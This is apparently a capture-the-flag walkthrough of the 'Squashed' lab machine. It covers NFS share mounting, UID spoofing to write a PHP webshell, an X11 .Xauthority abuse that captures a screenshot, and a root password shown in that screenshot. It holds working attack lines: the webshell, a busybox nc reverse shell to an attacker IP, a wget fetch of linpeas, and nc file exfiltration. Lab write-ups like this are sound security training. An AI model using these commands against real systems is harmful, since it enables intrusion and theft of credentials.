# Squashed: Easy

```sh
sudo vim /etc/hosts
# add squashed.htb

nmap -T4 -p- -A -Pn -v squashed.htb

sudo nmap -sU -Pn -v squashed.htb
# UDP scan
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
    * 80/tcp: http: Apache httpd 2.4.41
    * 111/tcp: rpcbind 2-4
    * 2049/tcp: nfs
    * 35121/tcp: nlockmgr
    * 45439/tcp: mountd
    * 49109/tcp: mountd
    * 51663/tcp: mountd

* we can also check with a UDP scan: this gives us a few open ports:

    * 111/udp: rpcbind
    * 2049/udp: nfs

* checking the webpage on port 80, we have a standard template webpage, and it does not have any outgoing links or useful info

* enumerating RPC:

    ```sh
    rpcinfo squashed.htb
    # this gives a lot of open services

    rpcclient -U "" -N squashed.htb
    # connection refused
    ```

    * ```rpcinfo``` gives a lot of services like ```portmapper```, ```mountd```, ```nfs```, ```nfs_acl``` and ```nlockmgr```

* enumerating NFS:

    ```sh
    showmount -e squashed.htb
    # shows two paths
    ```

* checking using ```showmount``` shows 2 available paths for mounting: ```/home/ross``` and ```/var/www/html```

* we can try mounting each of the directories to check for any secrets

* we can start by checking ```/home/ross``` share:

    ```sh
    sudo mkdir /mnt/ross

    sudo mount -t nfs squashed.htb:/home/ross /mnt/ross -o nolock
    # mount the directory

    ls -la /mnt/ross
    # check files for user 'ross'

    find /mnt/ross -type f
    # recursively list all files
    # this finds a '.kdbx' file

    ls -la /mnt/ross/Documents/Passwords.kdbx

    # copy the file to home dir

    cp /mnt/ross/Documents/Passwords.kdbx ~/

    exit

    sudo umount /mnt/ross
    # unmount dir
    ```

* we can check the Keepass database file and try to crack it if password-protected:

    ```sh
    which keepassx
    # not available

    sudo apt install keepassx

    keepassxc Passwords.kdbx
    # this requires a password

    # we can try cracking it using john
    keepass2john Passwords.kdbx > kdbx_hash
    # this fails with error "File version '40000' is currently not supported!'
    ```

* trying to use ```keepass2john``` to crack the '.kdbx' file fails, and we'll have to upgrade ```john``` tools

* to crack the newer KeePass 4 database versions, we need to use newer versions of ```john``` - we can refer [this article](https://www.lexo.ch/blog/2025/08/how-to-crack-kdbx4-keepass-databases-with-john-the-ripper/):

    ```sh
    git clone https://github.com/openwall/john.git

    cd john/src

    ./configure
    # configure source code for john the ripper

    make -s clean && make -sj4
    # compile code to create binaries

    cd ../run

    ./john --list=formats | grep --color -i keepass
    # this confirms the newer keepass versions are supported

    ./keepass2john ~/Passwords.kdbx > ~/kdbxhash
    # use the newer keepass2john binary

    cat ~/kdbxhash
    # this time the hash is created

    ./john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt ~/kdbxhash
    ```

* ```john``` is unable to crack the hash, so we can check the other share for ```/var/www/html```:

    ```sh
    sudo mkdir /mnt/web

    sudo mount -t nfs squashed.htb:/var/www/html /mnt/web -o nolock
    # mount the web dir

    ls -la /mnt/web
    # check for any secrets
    # we get permission denied

    sudo ls -la /mnt/web
    # this shows the files but with '?'

    sudo ls -la /mnt
    # the directory is owned by 'www-data' user with UID '2017'
    ```

* the web share files seem to contain files for the webpage, but we cannot access any of the files

* checking the listing of ```/mnt``` shows that the web share is owned by the 'www-data' user having UID '2017'

* we can try spoofing this user by creating an user on our box with the ID value '2017':

    ```sh
    # create group with gid '2017'
    sudo groupadd -g 2017 testgroup

    sudo useradd -u 2017 -g 2017 -m -s /bin/bash testing
    # create user with uid and gid '2017'

    sudo passwd testing
    # create a password for the new user

    su testing
    # switch to new user
    ```

* after switching to the new user with UID '2017', we can try writing a PHP webshell file to the mounted web share: if this works, we can access the webshell on port 80:

    ```sh
    cd /mnt/web

    ls -la
    # this shows the new user has write access

    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    # try creating a simple webshell
    # this works

    ls -la
    # we have the file created

    curl http://squashed.htb/shell.php?cmd=id
    # this confirms RCE as user 'alex'
    ```

* the webshell is written to the share, and using ```curl```, we can confirm RCE as user 'alex'

* however, the web share is cleaned regularly, so we need to use it quickly to get a reverse shell:

    ```sh
    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    # re-write the shell

    nc -nvlp 4444
    # setup listener

    curl http://squashed.htb/shell.php?cmd=busybox%20nc%2010.10.14.65%204444%20-e%20sh
    # use a URL-encoded revshell one-liner
    ```

* this works and we get a reverse shell as 'alex':

    ```sh
    id
    # 'alex'

    # stabilize shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg

    ls -la
    # in web directory

    ls -la /

    ls -la /home
    # we have users 'alex' and 'ross'

    # check alex files
    cd /home/alex

    cat user.txt
    # user flag

    ls -la
    # check all files
    ```

* we can use ```linpeas``` for initial enum: fetch script from attacker:

    ```sh
    wget http://10.10.14.65:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.4.0-131-generic, Ubuntu 20.04.5
    * multiple ports mapped to services
    * user 'ross' has UID '1001' and is part of a non-default group 'nopasswdlogin' (GID '130')
    * non-default group writable files: ```/var/translations```, ```/var/images```, and ```/var/images/pull_images.sh```
    * the ```/var/images``` file contains multiple image files with interesting names
    * ```/home/ross``` contains non-default files ```.Xauthority```, ```.xsession-errors``` and ```.xsession-errors.old```

* we can check the files in ```/var``` first:

    ```sh
    ls -la /var

    ls -la /var/translations
    # contains 3 files - 'anotherdoc', 'asdf' and 'somedoc'

    cat /var/translations/*
    # the file 'asdf' contains the string 'asdf'
    # other files are empty

    ls -la /var/images
    # contains a few image files, and a script

    cat /var/images/pull_images.sh
    ```

    ```sh
    #!/bin/bash
    cp /var/images/*.jpg /var/www/Cthulhu/home/static/home/images/
    cp /var/images/*.png /var/www/Cthulhu/home/static/home/images/
    ```

* the ```/var/images``` file contains a few image files:

    * 'al.jpg': empty
    * 'blin.png': empty
    * 'cthulhu-g6dfb6c762_1920.png'
    * 'cthulhu1_ycmNOEw.jpg'
    * 'kthulhu2.jpg'

* the script ```/var/images/pull_images.sh``` copies all image files from ```/var/images``` to the destination ```/var/www/Cthulhu/home/static/home/images/```

* however, the destination directory does not exist on the box, indicating the script has not been executed

* additionally, we have write privileges over the script as well as the image files

* running ```pspy``` does not give any insight as this script is not included in any cronjob

* if we try to run the script, we get errors as the target directory does not exist

* while we can write to the web directory via the mounted share, this cannot lead to privesc as the script would still be exeucted by current user and not root

* we can check for other privesc vectors via user 'ross'

* the '.Xauthority' and '.xsession' files for user 'ross' are files linked to the X Window System (X/X11) in Linux: only 'ross' user has read access to these files

* the '.Xauthority' file is used by X11 for authorization: we can try checking this file by mounting the ```/home/ross``` share from earlier:

    ```sh
    # on attacker

    sudo mount -t nfs squashed.htb:/home/ross /mnt/ross -o nolock
    # re-mount the dir

    ls -la /mnt/ross

    cat /mnt/ross/.Xauthority
    # we can access this file

    xxd /mnt/ross/.Xauthority
    # view file using xxd

    cp /mnt/ross/.Xauthority .
    ```

* as we can read this file, we can [use the '.Xauthority' file for getting access as 'ross'](https://www.verylazytech.com/x11-port-6000): we need to try this from the target as it is not working from the attacker machine:

    ```sh
    # on attacker
    
    cat .Xauthority | base64 -w 0; echo
    # copy the base64 content
    ```

    ```sh
    # on target
    # in reverse shell
    
    echo -n "<base64-encoded-content>" | base64 -d > .Xauthority
    # paste the base64 content

    w
    # shows current sessions
    # includes user 'ross' session on display ':0'

    # use the authority file for the env var
    export XAUTHORITY=~/.Xauthority

    xauth list
    # verify the cookie is stored

    xdpyinfo -display localhost:0
    # unable to open display

    xdpyinfo -display squashed.htb:0
    # unable to open display

    xdpyinfo -display :0
    # this works

    xwininfo -root -display :0
    # this also works
    ```

* the ```xdpyinfo``` command to check the display works and gives a lot of output: but nothing of use is mentioned here; ```xwininfo``` gives similar info

* we can try getting a screen capture:

    ```sh
    xwd -root -screen -silent -display :0 > screenshot.xwd
    # this works
    ```

* transfer the '.xwd' file to attacker:

    ```sh
    # on attacker
    nc -nvlp 6666 > screenshot.xwd
    ```

    ```sh
    # on target
    nc 10.10.14.65 6666 -w 3 < screenshot.xwd
    ```

* we can convert the '.xwd' file to an image file or view it directly using ImageMagick:

    ```sh
    # on attacker
    display screenshot.xwd
    ```

* this works, and the screenshot view shows an open KeePassXC window: the view discloses the creds 'root:cah$mei7rai9A'

* we can try re-using these creds for 'root' user:

    ```sh
    # in reverse shell

    su root
    # the creds work

    id
    # root

    cat /root/root.txt
    # root flag
    ```
